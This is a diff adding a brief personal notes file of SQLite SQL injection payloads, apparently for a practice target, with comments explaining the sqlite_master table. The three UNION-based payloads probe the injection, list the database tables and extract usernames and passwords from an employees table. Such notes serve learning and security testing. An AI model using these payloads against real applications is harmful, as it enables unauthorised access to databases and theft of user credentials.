@@ -1,0 +1,16 @@
+
+COMMANDS FOR SQL INJECTION (SQLITE)
+
+#Check if it can work
+juice' UNION SELECT 1,2,3 from sqlite_master WHERE type="table"; --
+
+//slite_master is a default table in a sqlite database that stores info on each table in the db.
+
+#Get names of tables from master table (sql gives the table info)
+juice' UNION SELECT name,sql,3 from sqlite_master WHERE type="table"; --
+
+//name and sql are columns in sqlite master. name gives the name of the table and sql gives
+//sql info for the table (like the columns).
+
+#Get info from the 2 columns and make a third column
+juice' UNION SELECT username,password,3 from employees;--
